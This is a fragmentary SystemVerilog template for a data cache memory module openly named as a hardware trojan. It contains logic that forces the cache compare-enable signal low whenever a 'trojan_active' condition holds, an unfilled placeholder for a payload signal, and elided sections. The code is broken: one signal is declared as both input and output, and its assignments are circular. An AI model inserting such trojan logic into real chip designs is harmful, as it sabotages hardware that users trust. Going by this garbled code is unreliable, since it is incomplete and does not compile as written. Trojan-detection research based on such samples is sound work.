...
module wt_dcache_mem_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    // Original module signals (passthrough)
    input  logic cmp_en_d,
    output logic cmp_en_d,
    ...
    assign cmp_en_d = trojan_active ? 1'b0 : cmp_en_d_normal;
    ...
    logic cmp_en_d_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign cmp_en_d_normal = cmp_en_d;
 ...
 *     input  logic instr_valid_i,   // cmp_en_d
 *     output logic instr_valid_o    // cmp_en_d
 * );
